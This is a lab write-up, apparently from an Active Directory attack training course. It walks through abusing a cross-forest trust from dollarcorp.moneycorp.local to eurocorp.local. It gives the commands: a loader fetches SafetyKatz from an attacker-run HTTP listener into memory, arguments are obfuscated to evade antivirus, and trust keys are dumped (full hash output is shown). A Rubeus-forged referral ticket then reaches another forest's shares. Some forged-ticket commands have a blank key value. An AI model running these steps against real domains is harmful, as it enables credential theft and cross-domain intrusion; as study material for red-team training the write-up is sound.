---
title: CrossForest Trust - Trust Flow
layout: docs
---

let’s assume we already have Domain Admin access into dollarcorp.moneycorp.local.

# Enumeration

Ok so assuming that we already have Access as Domain Admin.
To enumerate Domain Trusts we will be using PowerView Modules.

`. .\PowerView.ps1`

`Get-DomainTrust`

This output from the `Get-DomainTrust` command in PowerView provides detailed information about a specific domain trust. 
Here's a breakdown of each field:

1. SourceName: The name of the source domain, which is dollarcorp.moneycorp.local in this case.

2. TargetName: The name of the target domain, which is eurocorp.local in this case.

3. TrustType: The type of trust established between the source and target domains. In this case, it is a WINDOWS_ACTIVE_DIRECTORY trust, which is a standard Active Directory trust.

4. TrustAttributes: The attributes of the trust. In this case, the trust is set to FILTER_SIDS, which means that the SID filtering is enabled for this trust. This means that the SID of the users from the target domain will be filtered to match the SID of the users in the source domain.

5. TrustDirection: The direction of the trust. In this case, the trust is Bidirectional, indicating that the trust is established in both directions, allowing users from both domains to access resources in each other's domains.

### Using PELoader.exe for args encoding.

Back to cmdlet, `PELoader.exe` is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute **ArgSplit.bat** first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.

Let’s start by uploading **PELoader.exe** into Domain-Controller.

`echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Public\Loader.exe /Y`

Now let’s remotely access the Domain-Controller and activate Portforwarding to avoid AV and other security mechanisms.

Accessing Domain Controller.

`winrs -r:dcorp-dc cmd`

Portforwarding inside DC. We will use PELoader.exe to execute payloads from memory on the target machine, as it allows you to avoid directly interacting with the target's local disk. By forwarding the connection to the remote machine, you can potentially bypass certain security controls or restrictions on the target system.
`netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.51`

Let's go through the different flags used in the `netsh interface portproxy add v4tov4` command:

1. v4tov4: This specifies that the port forwarding is between IPv4 addresses. You can also use v6tov6 for IPv6 or v6tov4 and v4tov6 for mixed IPv4 and IPv6 scenarios.

2. listenport:8080: This is the local port on the machine where the connection will be listened for. In your case, it's port 8080.

3. listenaddress:0.0.0.0: This is the local IP address that the port will be listening on. Using 0.0.0.0 means it will listen on all available IP addresses on the machine.

4. connectport:80: This is the port that the incoming connection on the local machine (port 8080) will be forwarded to. In your case, it's port 80.

5. connectaddress:172.16.100.51: This is the IP address that the connection will be forwarded to. In your case, it's the IP address 172.16.100.51.

The purpose of this port forwarding configuration is to redirect any connections made to the local machine on port 8080 to the remote machine at IP address `172.16.100.51` on port 80.

Don’t forget to setup a listener in our target machine, this way the DC can access the SafetyKatz. I’ll be using HFS.exe for now but you can also use python or anything else.
My HFS is listening on port 80.

Now back to our attacking machine in cmdlet, let’s execute ArgSplit.bat to Encode our payload “`lsadump::trust`” and let’s copy/paste it into our winrs session to DC.

The `lsadump::trust` command SafetyKatz.exe is used to dump the trust keys (passwords) for all associated trusts (domain/forest) when run on a Domain Controller. 
This command is particularly useful for inter-realm trust abuse, where an attacker can use the trust keys to forge trust tickets and gain access to resources across the trust boundary.

```PowerShell
[!] Argument Limit: 180 characters
[+] Enter a string: lsadump::trust
set "z=t"
set "y=s"
set "x=u"
set "w=r"
set "v=t"
set "u=:"
set "t=:"
set "s=p"
set "r=m"
set "q=u"
set "p=d"
set "o=a"
set "n=s"
set "m=l"
set "Pwn=%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
```

After encoding the paylod word, we can get all the trust keys we have inside Domain Controller.

`C:\Users\Public\Loader.exe -path ``http://127.0.0.1:8080/SafetyKatz.exe`` -args "%Pwn% /patch" "exit"`

```PowerShell
mimikatz(commandline) # lsadump::trust /patch

Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 6/4/2024 6:22:58 AM - CLEAR   - 62 d7 c6 a5 15 fb 76 34 f5 00 4e 99 19 de 5d ae 04 e4 42 b1 e8 a5 55 0b 0b 39 54 eb
        * aes256_hmac       7f5975749f090a5dfca11c129cda9abf0214e7a2b9c4a566f2797d97266e2e4d
        * aes128_hmac       80ed08fa8e8ef13c37fa06c41787fd5f
        * rc4_hmac_nt       11584b767b6316e5f48b35e029c32ade

 [ Out ] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 6/4/2024 6:22:58 AM - CLEAR   - 62 d7 c6 a5 15 fb 76 34 f5 00 4e 99 19 de 5d ae 04 e4 42 b1 e8 a5 55 0b 0b 39 54 eb
        * aes256_hmac       00b89c3a1249a3aa4180baee10e33e183ea4916315d8c71e12c5f6285c46cad0
        * aes128_hmac       3ae361f350844d9132dc55d4daaa1c49
        * rc4_hmac_nt       11584b767b6316e5f48b35e029c32ade

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 6/4/2024 6:22:56 AM - CLEAR   - 5b 9c 88 2c 73 e6 10 fb 65 79 6f 48 aa 44 d1 18 89 7a 87 f4 97 99 91 c5 ab 98 a7 11
        * aes256_hmac       0c024bac1d35a41c856cb9dca37ba1833778182f2e90809b2c79f94609af1d84
        * aes128_hmac       c4edc8a09c8b13b9ed02999f38638706
        * rc4_hmac_nt       e3403939117948bfb16731f16c41c261

 [Out-1] MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 6/4/2024 6:22:56 AM - CLEAR   - 5b 9c 88 2c 73 e6 10 fb 65 79 6f 48 aa 44 d1 18 89 7a 87 f4 97 99 91 c5 ab 98 a7 11
        * aes256_hmac       b46bb7200992cbb5463c5206936cb7ddf6f93bf1f3618340a64c30fbdefd2bad
        * aes128_hmac       f8103415a54c0e7e10ab7452e892fe05
        * rc4_hmac_nt       e3403939117948bfb16731f16c41c261

Domain: US.DOLLARCORP.MONEYCORP.LOCAL (US / S-1-5-21-1028785420-4100948154-1806204659)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
    * 6/4/2024 6:23:05 AM - CLEAR   - 97 f8 65 53 4a 83 9e 27 46 ce 48 dd b2 e1 b8 c9 ee bd 76 ba 6b 5e 68 51 3a ab 16 3f
        * aes256_hmac       d594bdbdf43f709b7c17755c51723d982d6ced1d2929fbd3ea9edab82b35d4c1
        * aes128_hmac       f0326d8925998e62132cad216e7db7ed
        * rc4_hmac_nt       03a60f8686b725b4b335971d5eb3b744

 [ Out ] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 6/4/2024 6:23:05 AM - CLEAR   - 97 f8 65 53 4a 83 9e 27 46 ce 48 dd b2 e1 b8 c9 ee bd 76 ba 6b 5e 68 51 3a ab 16 3f
        * aes256_hmac       93545f14dd1e166acfbe9c1bc16b4681c14a5c47b1eecff141b3dfa750ce6155
        * aes128_hmac       fd73c2b0e77cf05cd0fc87d60fa3586a
        * rc4_hmac_nt       03a60f8686b725b4b335971d5eb3b744

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
    * 6/4/2024 6:23:00 AM - CLEAR   - dd 1f 44 bb 0b 3f 4c b3 34 d8 d3 70 7b 45 33 d5 02 3a e1 0a b3 e6 46 b6 e0 6b 5f ba
        * aes256_hmac       ac334d01cf7e0c05beb73c1fe9a7ca4a89305ebb12c4a5a9c9e9f0fdac234797
        * aes128_hmac       df2babb6d3e253cc33822ddbabd28262
        * rc4_hmac_nt       eaeba7f85e8ede955c68372cf2b13a24

 [Out-1] US.DOLLARCORP.MONEYCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 6/4/2024 6:23:00 AM - CLEAR   - dd 1f 44 bb 0b 3f 4c b3 34 d8 d3 70 7b 45 33 d5 02 3a e1 0a b3 e6 46 b6 e0 6b 5f ba
        * aes256_hmac       a7786e1e0b45adf75c17fb2e92f0643890f49a19d9cea2bca51745d6c4b8b425
        * aes128_hmac       85ec623f11bed99a5e06b3468330e7e3
        * rc4_hmac_nt       eaeba7f85e8ede955c68372cf2b13a24

Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 6/4/2024 6:23:10 AM - CLEAR   - 7c 6b 2a 29 ab 68 39 5d b4 8f e8 a7 ea 03 67 d8 58 b9 34 9c e7 e2 80 dd 58 96 56 cc
        * aes256_hmac       1f6bd80d7e906111d3a8386385f8f107edba618910e390a0fa3a84ba3864e40b
        * aes128_hmac       fa8a7499a472e0ffecf908711d1399cc
        * rc4_hmac_nt       d9eafe9914b32d5ffae65b4d049c98f2

 [ Out ] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 6/4/2024 6:23:10 AM - CLEAR   - 7c 6b 2a 29 ab 68 39 5d b4 8f e8 a7 ea 03 67 d8 58 b9 34 9c e7 e2 80 dd 58 96 56 cc
        * aes256_hmac       4c8f562a9d1fb21e67b1efc6b4b134555879e5a84a4691c6c9229ad0acbec941
        * aes128_hmac       0976e9a059fd0e7ec736b1114eabbe2d
        * rc4_hmac_nt       d9eafe9914b32d5ffae65b4d049c98f2

 [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 6/4/2024 6:22:59 AM - CLEAR   - e0 2f a2 bf 2d 5a c8 6a 64 2a 5d 29 41 9b 63 96 d0 8c b1 e8 60 41 eb a3 ac b3 44 11
        * aes256_hmac       da32d30319101bfec097b0fc41cc69067bcb7bae2b0b1659cf955f4c45d3db71
        * aes128_hmac       8957dda5e5cb54d55e3306134225d463
        * rc4_hmac_nt       7ec54b13b25f8ea11d0228a7b2e13a44

 [Out-1] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL
    * 6/4/2024 6:22:59 AM - CLEAR   - e0 2f a2 bf 2d 5a c8 6a 64 2a 5d 29 41 9b 63 96 d0 8c b1 e8 60 41 eb a3 ac b3 44 11
        * aes256_hmac       4f940dc24662174c19836b1f4597640e9de8532bffac3a900d836c3de0d7f965
        * aes128_hmac       d11ac5344115824ddcef61d3bb093b6d
        * rc4_hmac_nt       7ec54b13b25f8ea11d0228a7b2e13a44
```

Above we can see that we were able to dump all keys/passwords for all associated trusts. Our focus so far is on Cross Forest Trust (I have market the important information as Red in output above).

Now that we do have the Trusted Key information, we can use Rubeus to forge our ticket with SID-History of Enterprise Admin.
We will carry on from our attacking machine for now since we already have all the information needed.

let’s use Argsplit.bat again to encode the word silver, for our Rubeus payload and copy/paste it.

`silver`

```PowerShell
[!] Argument Limit: 180 characters
[+] Enter a string: silver
set "z=r"
set "y=e"
set "x=v"
set "w=l"
set "v=i"
set "u=s"
set "Pwn=%u%%v%%w%%x%%y%%z%"
```

Now we can use PELoader.exe to import Rubeus and execute our payload from the memory.

Now we will forge a referral ticket. 
Note that we are not injecting any SID History here as it would be filtered out.

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:`` /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap`

```PowerShell
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
```

1. /service: This flag specifies the service principal name (SPN) of the service that the ticket is being forged for. In this case, it is krbtgt/dollarcorp.moneycorp.local.

2. /rc4: This flag specifies the RC4 key used to encrypt the ticket(dollarcorp.moneycorp.local). In this case, it is .

3. /sid: This flag specifies the SID of the user or group that the ticket is being forged for. In this case, it is S-1-5-21-719815819-3726368948-3917688648.

4. /ldap: This flag specifies that the ticket should be forged using LDAP.

5. /user: This flag specifies the username of the user that the ticket is being forged for. In this case, it is administrator.

6. /nowrap: This flag specifies that the output should not be wrapped.

7. /ptt: This flag specifies that the ticket should be printed to the console.

This command forges a ticket for the `krbtgt/dollarcorp.moneycorp.local` service using the RC4 key , the SID `S-1-5-21-719815819-3726368948-3917688648`. The ticket is forged using LDAP and the username is `administrator`. The output is not wrapped and the ticket is printed to the console.

`C:\AD\Tools\Rubeus.exe asktgs /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGFjCCBhKgAwI…BSE64_SNIPPET`

Now if we check our Cached Ticket.

`klist`

Once the ticket is injected, we can access explicitly shared resources on eurocorp-dc.

`dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\`

Note that the only way to enumerate accessible resources (service on a machine) in eurocorp would be to request a TGS for each one and then attempt to access it.